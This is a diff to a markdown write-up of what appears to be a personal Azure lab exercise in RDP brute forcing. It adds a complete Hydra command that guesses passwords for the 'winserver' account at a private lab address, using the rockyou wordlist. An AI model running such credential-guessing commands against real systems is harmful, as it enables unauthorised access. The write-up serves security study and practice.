@@ -14,7 +14,7 @@ First step from an attacker perspective is to scan the subnet to see what device
 
 - **Bullet 2:** I performed a brute force attacking using Hydra.
    ```js
-   hydra
+   hydra -t 1 -V -l winserver -P rockyou.txt rdp://10.0.0.4
    ```
    
 ![alt text](https://github.com/nguyentimmy/azure-lab/blob/main/Azure%20Pen%20Testing/RDP%20Brute%20Force/Pictures/1.%20rdp%20bf.png)
